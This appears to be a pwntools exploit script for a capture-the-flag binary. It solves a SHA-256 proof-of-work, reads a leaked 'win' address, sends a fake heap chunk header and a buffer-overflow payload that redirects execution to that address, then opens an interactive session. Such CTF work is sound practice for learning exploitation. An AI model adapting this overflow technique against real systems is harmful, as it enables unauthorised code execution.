#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 3000
from pwn import *
import hashlib
import string

# Set up pwntools for the correct architecture
exe = './vuln'
context.terminal = ['tmux', 'new-window']
argv = ['./ld-2.32.so']
env = {'LD_PRELOAD':'./libc-2.32.so'}
libc = ELF('./libc-2.32.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 3000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(argv + [exe], gdbscript=gdbscript, *a, **kw)
    else:
        return process(argv + [exe], *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


def PoW(goal):
    for i in string.ascii_lowercase:
        for j in string.ascii_lowercase:
            for k in string.ascii_lowercase:
                for l in string.ascii_lowercase:
                    val = i+j+k+l
                    val = val.encode()
                    final = hashlib.sha256(val).hexdigest()
                    if final[-6:] == goal:
                        print("Found: ", val)
                        return val

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

val = io.recvline()
val =val.split(b'=')
val = val[1].decode()
val = val.replace(' ', '').replace('\n', '')

bla = PoW(val)

io.sendline(bla)

io.recvline()

win = io.recvline()

win = win[2:-1]

win = int(win,16)

print(hex(win))

fake_chunk = p64(0)
fake_chunk += p64(0x41)

payload = io.send(fake_chunk)

payload = b"A"*0x58
payload += p64(win)

io.sendline(payload)

io.interactive()

